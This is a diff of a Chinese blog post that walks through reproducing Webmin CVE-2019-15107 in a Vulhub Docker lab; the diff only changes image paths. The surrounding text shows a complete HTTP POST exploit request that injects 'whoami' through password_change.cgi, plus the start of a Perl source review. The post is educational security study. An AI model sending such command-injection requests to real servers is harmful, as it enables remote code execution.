@@ -14,7 +14,7 @@
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/webmin/CVE-2019-15107</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
 
 <p>然后访问 <code>https://[localhost]:10000/</code>，一定要使用https，然后忽略证书，不然访问不了</p>
-<p><img src="3311c747d122fe0c79e460eafea2f1b2.png" alt=""></p>
+<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/3311c747d122fe0c79e460eafea2f1b2.png" alt=""></p>
 <p>因为在系统中找不到修改密码的入口，就直接使用例子给出的http报文了，其中有几点要注意</p>
 <ul>
 <li>Host和Referer中的ip地址要改成自己的</li>
@@ -24,7 +24,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;password_change.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.241:10000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: redirect&#x3D;1; testing&#x3D;1; sid&#x3D;x; sessiontest&#x3D;1</span><br><span class="line">Referer: https:&#x2F;&#x2F;192.168.1.241:10000&#x2F;session_login.cgi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">user&#x3D;rootxxgb&amp;pam&#x3D;&amp;expired&#x3D;2&amp;old&#x3D;whoami&amp;new1&#x3D;test2&amp;new2&#x3D;test2</span><br></pre></td></tr></table></figure>
 
 <p>发送数据包后，可以看到命令已被执行</p>
-<p><img src="d83b2d737debb6ef8a028befb5cf6cd2.png" alt=""></p>
+<p><img src="Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/d83b2d737debb6ef8a028befb5cf6cd2.png" alt=""></p>
 <h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>下载 <a href="https://sourceforge.net/projects/webadmin/files/webmin/1.910/webmin-1.910.zip/download" target="_blank" rel="noopener">webmin-1.910</a>（杀毒软件会报存在后门）</p>
 <p>Webmin是用Perl写的，因为我从来没有写过Perl，所以只能边百度边审计</p>
 <h2 id="Perl语法"><a href="#Perl语法" class="headerlink" title="Perl语法"></a>Perl语法</h2><p>Perl可以用反引号 `` 包裹住字符串，反引号内的字符串会交给Shell执行</p>
